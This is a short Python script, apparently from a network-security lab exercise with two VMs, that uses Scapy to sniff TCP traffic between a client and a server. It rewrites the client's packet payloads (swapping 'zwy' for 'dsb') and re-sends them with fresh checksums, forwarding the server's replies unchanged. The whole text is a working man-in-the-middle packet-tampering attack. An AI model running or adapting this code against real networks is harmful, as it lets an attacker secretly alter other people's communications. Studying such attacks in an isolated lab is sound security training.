#!/usr/bin/python3
from scapy.all import *
VM_CLIENT_IP = "192.168.43.8"
VM_SERVER_IP = "192.168.43.49"
VM_CLIENT_MAC = "00:0c:29:c8:4b:9f"
VM_SERVER_MAC="00:0c:29:2b:f9:df"
def spoof_pkt(pkt):
	if pkt[IP].src==VM_CLIENT_IP and pkt[IP].dst==VM_SERVER_IP:
		IPLayer = IP(pkt[IP])
		del(IPLayer.chksum)
		del(IPLayer[TCP].payload)
		del(IPLayer[TCP].chksum)

		Data = str(pkt[TCP].payload).replace("zwy", "dsb")
		newpkt = IPLayer/Data

		send(newpkt, verbose=0)
	elif pkt[IP].src==VM_SERVER_IP and pkt[IP].dst==VM_CLIENT_IP:
		newpkt = pkt[IP]
		send(newpkt, verbose=0)

pkt = sniff(filter='tcp and (ether src '+VM_CLIENT_MAC+' or ether src '+VM_SERVER_MAC+')', prn=spoof_pkt)